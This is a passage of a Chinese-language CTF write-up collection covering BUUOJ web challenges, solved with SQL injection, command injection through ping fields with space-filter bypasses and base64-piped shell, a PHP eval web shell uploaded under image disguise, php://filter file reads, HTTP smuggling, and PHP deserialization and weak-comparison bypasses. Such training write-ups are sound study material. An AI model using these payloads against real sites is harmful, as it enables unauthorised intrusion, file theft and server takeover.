2.php伪协议利用\n\n这个比较复杂，之后再专门总结一下，反正这里涉及了file，那么尝试用该协议的payload来读取\n\n```\n/?file=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n这里给出的是比较普遍性的，用base64来进行获取的，读取之后得到base64编码的一串字符\n\n![image-20220107121629962](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071216007.png)\n\n## 3.base64解码\n\n获取到上面的base64编码后，运用CyberChef解码即可得到flag\n\n![image-20220107121805266](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071218337.png)\n\n\n\n# 五、[强网杯 2019]随便注1\n\n## 🔺SQL注入+三种姿势\n\n可以先用单引号判断是否存在SQL注入\n\n```\n/index.php?inject=1'\n```\n\n出现如下，出错则代表存在\n\n![image-20220107125314983](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071253029.png)\n\n那么先查询存在的表\n\n```\n/index.php?inject=';show tables;#\n```\n\n发现有如下两个表\n\n![image-20220107162320203](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071623241.png)\n\n然后分别查看一下对应的\n\n```\n/index.php?inject=';show columns from words;#\n```\n\n![image-20220107162923778](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629819.png)\n\n```\n/index.php?inject=';show columns from `1919810931114514`;#\n```\n\n![image-20220107162957623](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629659.png)\n\n那么flag就在表1919810931114514中，注意查询数字表的时候需要加**反引号`**\n\n## 解析words表\n\n那么由于输入1，2会出现如下数据\n\n![image-20220107164211829](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642873.png)\n\n![image-20220107164221323](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642355.png)\n\n这里的第二个数据段是字符型，那么就应该是在表words中，此时就大概是如下的表格\n\n| id   | data         |\n| ---- | ------------ |\n| 1    | hahahah      |\n| 2    | miaomiaomiao |\n\n## 解析`1919810931114514`表\n\n依据列大概猜测如下\n\n| flag            |\n| --------------- |\n| ...........不知 |\n\n这里select被过滤了，无法直接从表1919810931114514中获取所以尝试一下其他的解法。\n\n\n\n## 1.解法一(改表)\n\n修改表名字，使得保存flag的表1919810931114514名字变为表words，之后把flag字段变为data字段，添加id字段，输入1,2然后就可以打印出flag了。\n\n### (1)改名\n\n```\n/index.php?inject=1'; rename table words to word1; rename table `1919810931114514` to words;#\n```\n\n### (2)增添id字段\n\n```\n/index.php?inject=1'; alter table words add id int unsigned not Null auto_increment primary key;#\n```\n\n### (3)修改flag为data字段\n\n```\n/index.php?inject=1';alert table words change flag data varchar(100);#\n```\n\n### 总的payload\n\n```\n/index.php?inject=1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;alert table words change flag data varchar(100);#\n```\n\n最后输入1提交即可\n\n\n\n## 2.解法二(open和handler)\n\n利用open和handle关键字\n\n```\n/index.php?inject='; handler `1919810931114514` open as `a`; handler `a` read next;#\n```\n\n这样可以直接读出来表`1919810931114514`的所有内容\n\n![image-20220107171100441](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071711484.png)\n\n\n\n## 3.解法三(MySQL的预处理)\n\n利用预处理机制prepare和concat拼接获得select操作，之后execute来执行，这里好像不能小写，可以通过大写来绕过\n\n```\n/index.php?inject=';PREPARE st from concat('s','elect', ' * from `1919810931114514` \n');EXECUTE st;#\n```\n\n![image-20220107171702374](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071717419.png)\n\n\n\n\n\n# 六、[SUCTF 2019]EasySQL\n\n涉及知识点有点多\n\n\n\n# 七、[ACTF2020 新生赛]Exec\n\n## 🔺命令执行+寻找flag\n\n## 1.远程命令执行\n\n一般这种ping的界面，都可能会涉及到命令执行\n\n![image-20220109120351450](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091203487.png)\n\n那么直接尝试一下即可，ping一下本地回环地址\n\n输入\n\n```\n127.0.0.1;pwd\n```\n\n![image-20220109120428320](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091204354.png)\n\n可以看到存在远程命令执行，那么就尝试找flag在哪，也就是一个路径搜索。\n\n## 2.搜索flag路径\n\n输入\n\n```\n127.0.0.1;ls\n```\n\n![image-20220109120604954](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206984.png)\n\n那么去根目录找\n\n输入\n\n```\n127.0.0.1;ls /\n```\n\n![image-20220109120649283](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206321.png)\n\n可以看到flag，那么直接cat即可\n\n```\n127.0.0.1;cat /flag\n```\n\n得到flag\n\n![image-20220109120742963](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091207995.png)\n\n\n\n# 八、[极客大挑战 2019]Secret File\n\n## 🔺抓包+伪协议\n\n## 1.前期探索\n\n查看源代码，有如下文件，访问一下\n\n![image-20220109121055447](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091210479.png)\n\n接着按照提示，但是直接跳转到了\n\n![image-20220109121144475](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091211532.png)\n\n那么中间可能执行太快，这时候就需要抓包来看看具体是怎么执行的。\n\n## 2.抓包\n\n用BurpSuit抓包，发现有一个action.php，里面有个secr3t.php的提示\n\n![image-20220109183459387](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091834445.png)\n\n访问一下secr3t.php\n\n![image-20220109183542434](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091835473.png)\n\n提示放在了flag.php，访问之后发现什么也没有\n\n![image-20220109183616033](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091836077.png)\n\n那么这里由于secr3t.php存在file的协议，所以可以尝试使用php伪协议获取flag.php的源代码\n\n```\n/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n![image-20220109183730031](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091837080.png)\n\n拿到CyberChef解密，得到flag\n\n![image-20220109183825033](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091838079.png)\n\n\n\n\n\n# 九、[极客大挑战 2019]LoveSQL\n\n\n\n\n\n\n\n# 十、[GXYCTF2019]Ping Ping Ping\n\n## 🔺命令执行\n\n## 1.前期探索\n\nPing提示+ip，应该是命令执行，直接ls试试\n\n```\n/?ip=127.0.0.1;ls\n```\n\n![image-20220110200315404](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102003467.png)\n\n发现flag，尝试cat\n\n```\n/?ip=127.0.0.1;cat flag.php\n```\n\n![image-20220110200415489](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102004540.png)\n\n## 2.绕过过滤\n\n应该是过滤的空格\n\n▲绕过空格：一般思路如下\n\n```\n$IFS\n${IFS}\n$IFS$1 //其中那个1加其他的应该都行\n<\n<>\n{cat,flag.php}\n$20\n$09(空字符)\n```\n\n参考[[GXYCTF2019\\]Ping Ping Ping - 春告鳥 - 博客园 (cnblogs.com)](https://www.cnblogs.com/Cl0ud/p/12313368.html)\n\n使用`$IFS`可以，但是又发现过滤了flag\n\n![image-20220110202147216](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102021256.png)\n\n那么接下的解法就多种多样了。\n\n### 解法一：拼接flag\n\n```\n/index.php?ip=127.0.0.1;b=ag.php;a=fl;cat$IFS$1$a$b\n```\n\nflag在注释里，查看网页源代码即可\n\n![image-20220111112715736](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111127902.png)\n\n### 解法二：sh结合base64\n\n#### ▲linux自带base64和base32\n\n由于linux的sh自带base64的加解密，所以我们可以传入base64的密文，然后利用linux的sh终端自带的base64解密功能进行解密，这样可以在一定程度上绕过很多过滤，另外base32也可以\n\n#### (1)base64加密\n\n使用CyberChef或者linux命令行都行\n\n![image-20220111113614306](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136396.png)\n\n![image-20220111113634402](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136522.png)\n\n#### (2)base64解密\n\n```\necho Y2F0IGZsYWcucGhwCg== | base64 -d | sh\n```\n\n将之前加密的\"cat flag.php\"传给base64解密，然后sh执行\n\n对应写在URL上即为\n\n```\n/index.php?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh\n```\n\n### 解法三：linux内联执行\n\n命令中会先执行反引号里的，然后将输入结果依次传递给其他命令进行执行\n\n由于flag就在当前文件夹下，所以\n\n```bash\ncat `ls`;\n#先执行ls输出 index.php 和 flag.php，之后将输入结果给到cat命令，相当于再执行 cat index.php;cat flag.php\n```\n\n对应URL为\n\n```\n/index.php?ip=127.0.0.1;cat$IFS$9`ls`\n```\n\n## ▲其他\n\n此外命令执行有很多方法可以绕过，这里ban掉了很多，像`<`，`\\`等都是有可能\n\n[命令执行绕过的方法 - GLCC - 博客园 (cnblogs.com)](https://www.cnblogs.com/GLory-LTF/p/15359485.html)\n\n\n\n# 十一、[极客大挑战 2019]Knife\n\n## 🔺一句话木马\n\n依据提示以及如下的语句，猜测是一句话木马，密码为Syc\n\n![image-20220111144925504](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111449555.png)\n\n使用蚁剑连接\n\n蚁剑教程：[获取蚁剑 · 语雀 (yuque.com)](https://www.yuque.com/antswordproject/antsword/srruro)\n\n然后直接复制URL进行连接即可，右键->添加数据\n\n![image-20220111145119474](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451527.png)\n\n进去之后进入根目录寻找flag\n\n![image-20220111145143729](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451771.png)\n\n![image-20220111145208831](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111452893.png)\n\n\n\n\n\n# 十二、[极客大挑战 2019]Http\n\n## 🔺使用BurpSuit改包头\n\n## 1.前期探索\n\n直接源代码，搜索.php，发现一个Secrect.php\n\n![image-20220111141159974](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412036.png)\n\n然后访问，发现需要从https://Sycsecret.buuoj.cn访问才行\n\n![image-20220111141218518](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412596.png)\n\n那么就使用BurpSuite进行修改\n\n## 2.BurpSuite使用改包\n\n首先浏览器开启代理，BurpSuite抓到包\n\n![image-20220111141339457](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111413501.png)\n\n然后将包发送到`repeater`\n\n![image-20220111141424655](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111414701.png)\n\n在Repeater最新出现的一部分就是\n\n![image-20220111141531436](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111415489.png)\n\n### (1)修改Referer\n\n由于说要从https://Sycsecret.buuoj.cn访问，所以添加如下，在Get下添加\n\n```\nReferer: https://Sycsecret.buuoj.cn\n```\n\n![image-20220111141726767](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111417813.png)\n\n点击Go按钮发送包\n\n![image-20220111141823417](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418470.png)\n\n返回的包提示不行，那么需要修改浏览器名称\n\n![image-20220111141837951](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418007.png)\n\n### (2)修改User-Agent\n\n修改如下\n\n```\nUser-Agent: Syclover\n```\n\n![image-20220111142004093](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420138.png)\n\n还是不行，提示需要从本地local读取\n\n![image-20220111142051767](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420811.png)\n\n### (3)修改X-Forwarded-For\n\n添加如下\n\n```\nX-Forwarded-For: 127.0.0.1\n```\n\n![image-20220111142201689](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422737.png)\n\n发送后得到flag\n\n![image-20220111142221310](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422352.png)\n\n\n\n\n\n# 十三、[极客大挑战 2019]Upload\n\n## 🔺文件上传漏洞、一句话木马\n\n## 1.前期探索\n\n进入之后发现让选择图片进行上传，那么就考虑一句话木马的隐写，然后再上传\n\n首先尝试上传.php文件，失败，接着考虑测绕过。\n\n## 2.绕过过滤\n\n### (1)修改Content-Type\n\n![image-20220112120212319](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202373.png)\n\n失败，后缀名不能为.php\n\n![image-20220112120239252](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202287.png)\n\n### (2)修改后缀名\n\n修改为phtml，这种格式在服务器也会被作为php文件解析。\n\n![image-20220112120451143](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121204190.png)\n\n成功，但是不能是`<?`开头，那么尝试使用html格式。还有的php文件后缀名可以修改如下\n\n```\n- 利用中间件解析漏洞绕过检查，实战常用\n- 上传.user.ini或.htaccess将合法拓展名文件当作php文件解析\n- %00截断绕过\n- php3文件\n- php4文件\n- php5文件\n- php7文件\n- phtml文件\n- phps文件\n- pht文件\n```\n\n[[BUUOJ记录\\] [ACTF2020 新生赛]Upload - Ye'sBlog - 博客园 (cnblogs.com)](https://www.cnblogs.com/yesec/p/12403922.html)\n\n\n\n### (3)修改php格式\n\n修改内容为\n\n```\n<script language=\"php\">eval($_POST['shell']);</script>\n```\n\n![image-20220112120616999](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121206053.png)\n\n成功，但是也被探测到，那么尝试修改文件头部格式\n\n![image-20220112120712009](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121207056.png)\n\n### (4)尝试修改文件头部\n\n在文件头加上`GIF89a`\n\n![image-20220112121007758](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210799.png)\n\n上传成功\n\n![image-20220112121056862](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210905.png)\n\n## 3.查找上传文件路径\n\n一般而言，上传的都在upload，成功找到\n\n![image-20220112121305153](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121213219.png)\n\n那么蚁剑连接，根目录下找到flag\n\n![image-20220112121815697](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121218740.png)\n\n# 十四、[ACTF2020 新生赛]Upload\n\n和十三题一样，直接一句话木马，文件格式为phtml，修改content-type即可，然后蚁剑连上在根目录下找flag。需要注意的是要先上传成功一个文件才会抓到上传的包，因为这里的验证是在前端验证后缀名的。\n\n\n\n# 十五、[RoarCTF 2019]Easy Calc\n\n## 🔺命令执行、php字符串解析、HTTP走私攻击\n\n## 1.前期探索\n\n查看源代码，发现如下.php文件\n\n![image-20220112190657868](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121906058.png)\n\n访问一下，发现源代码，分析过滤了一些东西，然后我们输入的num字符串进行解析，并且使用eval执行后输出\n\n![image-20220112191231694](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121912749.png)\n\n主要以下代码，过滤了很多东西，然后执行输出\n\n```php\n$str = $_GET['num'];\n$blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\neval('echo '.$str.';')\n```\n\n尝试phpinfo()，发现直接报错，大佬们说是Waf的原因，具体也不太知道怎么判断出Waf的，经过测试，这里的waf会过滤掉所有带字母的num变量内容。\n\n![image-20220113115855930](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131203691.png)\n\n所以大概有两种方法\n\n## 2.解决方法\n\n### 解法一：利用php字符串解析特性绕过WAF\n\n#### (1)绕过WAF\n\n利用php解析字符串时，会自动去掉多余的空格这个特性，即当我们调试时\n\n输入中间加入了空格的num，发现php依然能够成功解析出num这个变量\n\n```\nhttp://127.0.0.1/index.php?%20num=phpinfo()\n```\n\n![image-20220113115626996](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156038.png)\n\n![image-20220113115655830](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156886.png)\n\n但是WAF可不会管空不空格的，对于Waf来说，传过去的是带了空格的num变量，不是num变量，所以不会进行过滤，会将带了空格的num变量传递给calc.php文件进行解析，这样就成功绕过了WAF。\n\n#### (2)绕过过滤\n\n由于过滤了`/`，所以这里使用`chr(47)`来进行绕过，这是`/`字符的ascii码\n\n先查看根目录下有什么内容\n\n```\n/calc.php?%20num=var_dump(scandir(chr(47)))\n```\n\n发现有flag\n\n![image-20220113121152229](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131211277.png)\n\n那么利用php中的函数进行获取\n\n```\n/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))\n```\n\n得到flag\n\n![image-20220113121256750](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131212797.png)\n\n### 解法二：利用HTTP走私攻击\n\n这个具体的原理实在是有点不太能理解，可能需要深入研究一下。以我的理解来说，就是通过修改`content-length`或者`Transfer-Encoding`，来使得数据包在前后端解析的过程中，让前端以为该数据包的内容比较少，使其认为不包含需要过滤的内容，从而把完整的数据包发给后端，绕过前端的Waf等过滤。\n\nBurpSuit抓包之后，修改`content-length`或者`Transfer-Encoding`\n\n\n\n#### (1)利用CL-CL\n\n![image-20220113150704935](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131507999.png)\n\n```\nContent-Length: 0\nContent-Length: 0\n```\n\n#### (2)利用CL-TE\n\n![image-20220113151848304](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131518370.png)\n\n```\nTransfer-Encoding: chunked\nContent-Length: 3\n```\n\n有时候又很奇怪，就离谱。\n\n同时GET改成POST也是可以的。\n\n后面都一样了，就是绕过后端的过滤。\n\n\n\n[4.17. HTTP 请求走私 — Web安全学习笔记 1.0 文档 (websec.readthedocs.io)](https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html)\n\n\n\n# 十六、[极客大挑战 2019]PHP\n\n## 🔺PHP反序列化\n\n## 1.分析\n\n`dirsearch`扫描发现`www.zip`，该文件为网址备份文件，可以下载下来，其中为\n\n![image-20220710161845497](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220710161845497.png)\n\n之后看`index.php`中有如下代码\n\n![image-20220710161859892](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220710161859892.png)\n\n再转到`class.php`\n\n```php\n<?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n\n    function __wakeup(){\n        $this->username = 'guest';\n    }\n\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n        }\n    }\n}\n?>\n```\n\n在`__destruct`函数中，当传入的用户名为`admin`会输出`flag`，但是在`__wakeup`函数中，用户名被赋值为`guest`。我们知道`__wakeup`是在反序列化的最开始调用的，需要去找个绕过方法。\n\n## 2.绕过`__wakeup`\n\n### (1)CVE-2016-7124\n\n满足如下条件\n\n```\nPHP5 < 5.6.25\nPHP7 < 7.0.10\n```\n\n在反序列化时，成员个数的值大于实际成员个数时，会跳过`__wakeup`函数的执行，也就是使得传入的序列化字符串的成员个数大于实际的成员个数。如下，将`Name`这个对象对应的成员个数由原本的2改为3即可绕过。\n\n```\nO:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\nO:4:\"Name\":3:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\n```\n\n参考：[PHP 内核层解析反序列化漏洞 (seebug.org)](https://paper.seebug.org/866/#php_2)\n\n### (2)小技巧\n\n对于实际添加成员的属性也能从一种程度上绕过`__wakeup`，如下所示\n\n```php\n<?php\nclass A{\n    function __toString(){\n        print_r(\"calling __toString\\n\");\n        return \"\";\n    }\n    function __wakeup(){\n        print_r(\"calling __wakeup\\n\");\n    }\n}\n\nclass B{\n    public $a;\n    function __destruct(){\n        echo $this->a;\n    }\n}\n$b = new B();\n$b->a = new A();\n$myStr = serialize($b);\nprint_r($myStr);\n\n//$objStr = 'O:1:\"B\":1:{s:1:\"a\";O:1:\"A\":0:{}s:1:\"n\":N;}';\n//$originStr = 'O:1:\"B\":1:{s:1:\"a\";O:1:\"A\":0:{}}';\n//unserialize($objStr);\n//echo \"aa\";\n?>\n```\n\n先生成一下序列化链子，得到`$originStr`\n\n```\n$originStr = 'O:1:\"B\":1:{s:1:\"a\";O:1:\"A\":0:{}}';\n//添加一个属性 `s:1:\"n\":N;`得到如下$objStr\n$objStr = 'O:1:\"B\":1:{s:1:\"a\";O:1:\"A\":0:{}s:1:\"n\":N;}';\n```\n\n之后进行反序列化，发现先`__toString`，再调用`__wakeup`\n\n```\nunserialize($objStr);\n```\n\n这样也代表从另一种方式绕过`__wakeup`函数了。\n\n此外替换`s:1:\"n\":N;`为`;`其实也是可以的，在`php8`版本下也是可以的，不知道是不是某个`CVE`，\n\n### (3)php_bug\n\n题目见：**Sekai Game Start**\n\n[PHP :: Bug #81151 :: bypass __wakeup](https://bugs.php.net/bug.php?id=81151)\n\n```php\n<?php\nclass E  {\n\tpublic function __construct(){\n\n\t}\n\n\tpublic function __destruct(){\n\t\techo \"destruct\";\n\t}\n\n\tpublic function __wakeup(){\n\t\techo \"wake up\";\n\t}\n}\n\nvar_dump(unserialize('C:1:\"E\":0:{}'));\n```\n\n如下所示，在`php8.0`也可以\n\n![image-20221004155126882](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221004155126882.png)\n\n\n\n## 3.private成员\n\n序列化时\n\n```php\n<?php\n\nclass Name{\n    public $username = 'nonono';\n    private $password = 'yesyes';\n    protected $cookie = 'cookie';\n\n    public function __construct($username,$password,$cookie){\n        $this->username = $username;\n        $this->password = $password;\n        $this->cookie = $cookie;\n    }\n}\n$a = new Name('admin', 100,\"cookie\");\n$b = serialize($a);\necho \"aaa\";\n\n?>\n```\n\n不同类型的成员序列化之后成员变量名保存的形式不太一样\n\n- private\n\n  变为`\\x00className\\x00memberName`\n\n- public\n\n  仍然为原始的，即`username`\n\n- protected\n\n  变为`\\x00*\\x00memberName`\n\n所以在传入反序列字符串时，需要考虑到这些特点，这里对应`private`成员就需要传入`URL`编码的`\\x00`即`%00`\n\n## 4.最终payload\n\n修改成员数量绕过`__wakeup`，加入`%00`表示`private`成员\n\n```\nselect=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n```\n\n# 十七、[ACTF2020 新生赛]BackupFile\n\n## 🔺PHP弱类型比较、网站源码备份\n\n首先获取备份源码`url/index.php.bak`，扫一下也可以\n\n```php\n<?php\ninclude_once \"flag.php\";\n\nif(isset($_GET['key'])) {\n    $key = $_GET['key'];\n    if(!is_numeric($key)) {\n        exit(\"Just num!\");\n    }\n    $key = intval($key);\n    $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\";\n    if($key == $str) {\n        echo $flag;\n    }\n}\nelse {\n    echo \"Try to find out source file!\";\n}\n\n```\n\n看到当传入的`key`等于`str`时会打印`flag`，但是又不能传字符，这里就用到弱类型比较\n\n```php\n<?php\n$key = 123;\n$abc = \"123aaaa\";\nif($key == $abc){\n    echo \"bbbb\";\n}\n?>\n```\n\n上述代码会输出`bbbb`，原因就是当`==`比较对象中任意一个为数字，就会把另一个比较对象也强制转换为数字，对于字符串型的强制转换，会从左开始遍历，直到碰到非数字的部分，丢弃之后的部分，转换为数字，所以条件成立。\n\n```php\n$abc = \"123aaaa333\";\necho intval($abc);\n```\n\n上述代码会输出`123`，\n\n那么传入`key=123`即可。\n\n# 十八、[HCTF 2018]admin\n\n## 🔺爆破、模板库函数、\n\n[一题三解之2018HCTF&admin - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/164086#h3-6)\n\n提示`admin`，有登录注册界面，注册界面注册`admin`失败，应该有该用户。那么直接尝试`Burpsuite`弱密码爆破。BUU平台发包需要慢一点\n\n![image-20220711121051309](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220711121051309.png)\n\n爆出来123，登录得`flag`。这不算什么解法，就记录一下。\n\n## 1.解法一\n\n`python`的`flask`模板库`Twisted`中的函数问题\n\n在修改密码的页面源代码有提示，该网站使用的为`python`的`flash`模板，给了相关网址：[woadsl1234/hctf_flask: hctf_flask (github.com)](https://github.com/woadsl1234/hctf_flask)，其中的各个包版本\n\n![image-20220712144242517](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220712144242517.png)\n\n- 查找`flask`的路由`routes.py`，注册、登录、修改密码的相关函数，使用的都是`strlower`函数\n\n  ```python\n  def strlower(username):\n      username = nodeprep.prepare(username)\n      return username\n  ```\n\n  来将用户名进行小写化，而`nodeprep`位于包`Twisted==10.2.0`\n\n- 下载对应版本的包，跟进查看函数\n\n  ```python\n  nodeprep = Profile(mappings=[B_1, B_2],\n                     prohibiteds=[C_11, C_12, C_21, C_22,\n                                  C_3, C_4, C_5, C_6, C_7, C_8, C_9,\n                                  LookupTable([u'\"', u'&', u\"'\", u'/',\n                                               u':', u'<', u'>', u'@'])])\n  ```\n\n  使用相关的`unicode`编码，相关编码可查：\n\n  [Unicode - Unicode Character Table (unicode-table.com)](https://unicode-table.com/en/blocks/)\n\n  制定了相关表格索引，不知道是怎么制定的，应该是字典啥的把，比如经过`nodeprep.prepare`之后\n\n  ```\n  u'\\u0041'  ---->   u'\\u0061'\n  A          ---->   a\n  ```\n\n  不过在该题的版本下，也就是`Twisted==10.2.0`，其内部代码可能有点问题，导致\n\n  ```\n  u'\\u1d2c'  ---->   u'\\u0041'\n  ᴬ          ---->   A\n  ```\n\n  这样就有点问题，导致如下情况\n\n  ```\n  strlower('ᴬ')=A\n  strlower('A')=a\n  ```\n\n  不过现在最新版本的`Twisted`已经没了这个问题。\n\n- 依据这样，注册的时候使用`ᴬdmin`，变成了用户`Admin`。然后登录`Admin`，修改密码，变成了修改`admin`的密码，即可得到`admin`账户。\n\n## 2.解法二\n\n利用`flask`模板存在于客户端的缺陷，伪造`session`，版本安装老失败，放弃\n\n## 3.解法三\n\n条件竞争，就是在改密码的时候中断，然后利用登录功能，尝试登录`admin`，将当前的`session['name']`改为`admin`，之后再回到改密码的地方，将`admin`的密码改掉。\n\n![image-20220713111008888](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220713111008888.png)\n\n按理说再登录的时候，应该先查有没有该用户的，登录之后再进行`session['name']`的赋值这里就是利用了先赋值`session['name']`的漏洞。\n\n# 十九、[BJDCTF2020]Easy MD5\n\n[[BUUOJ记录\\] [BJDCTF2020]Easy MD5 - Ye'sBlog - 博客园 (cnblogs.com)](https://www.cnblogs.com/yesec/p/12535534.html)\n\n## 🔺MD5+SQL、PHP弱比较、数组绕过\n\n## 1.MD5实现SQL注入\n\n第一关的的`http`头部有`hint`\n\n```sql\nselect * from 'admin' where password=md5($pass,true)\n```\n\n参数为`true`代表返回原始16字符二进制格式，也就是相当于`SQL`语句被`md5`之后的字符直接控制，那么尝试构造如下\n\n```sql\nselect * from 'admin' where password=''or'xxx' \n```\n\n这样就能绕过了。\n\n也就是找一个字符串`str`，其`md5(str)='or'xxx `，而`'or' `对应的16进制为`0x276f7227`，那么字符串`ffifdyop`的`md5`就满足这个条件(不知道这么来的)。\n\nPS：那如果以后想找不一样的的，是否需要用到`md5`碰撞？\n\n## 2.PHP结合MD5弱类型比较\n\n查看源码，注释部分有提示\n\n```php\n$a = $GET['a'];\n$b = $_GET['b'];\n\nif($a != $b && md5($a) == md5($b)){\n    // wow, glzjin wants a girl friend.\n```\n\n这个没啥好说的，找一下`0exx`这个科学计数法，代表0的xx次方，还是0。`QNKCDZO`和`s214587387a`\n\n## 3.数组绕过\n\n有源码\n\n```php\n <?php\nerror_reporting(0);\ninclude \"flag.php\";\n\nhighlight_file(__FILE__);\n\nif($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n    echo $flag;\n} \n```\n\n利用`PHP`的`md5`计算特性\n\n```\nmd5(array()) = null\nsha1(array()) = null    \nereg(pattern,array()) = null vs preg_match(pattern,array) = false\nstrcmp(array(), \"abc\") = null\nstrpos(array(),\"abc\") = null\n```\n\n`POST`传入`param1[]=1&param2[]=2`即可得到Flag\n\n# 二十、[ZJCTF 2019]NiZhuanSiWei\n\n## 🔺伪协议、反序列化\n\n给了源码\n\n```php\n<?php  \n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\n$password = $_GET[\"password\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"welcome to the zjctf\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        echo \"Not now!\";\n        exit(); \n    }else{\n        include($file);  //useless.php\n        $password = unserialize($password);\n        echo $password;\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n需要设置`text`，但是用的是`file_get_contents`，这个需要为文件流，可以使用`data`伪协议。\n\n```\ntext=data://text/plain,welcome%20to%20the%20zjctf\n```\n\n然后`file`提示包含进`useless.php`，使用`php://filter/`伪协议进行读取\n\n```\nfile=php://filter/read=convert.base64-encode/resource=useless.php\n```\n\n`base64`解码后获取到源码\n\n```php\n<?php \n \nclass Flag{  //flag.php \n    public $file; \n    public function __tostring(){ \n        if(isset($this->file)){ \n            echo file_get_contents($this->file);\n            echo \"<br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        } \n    } \n} \n?> 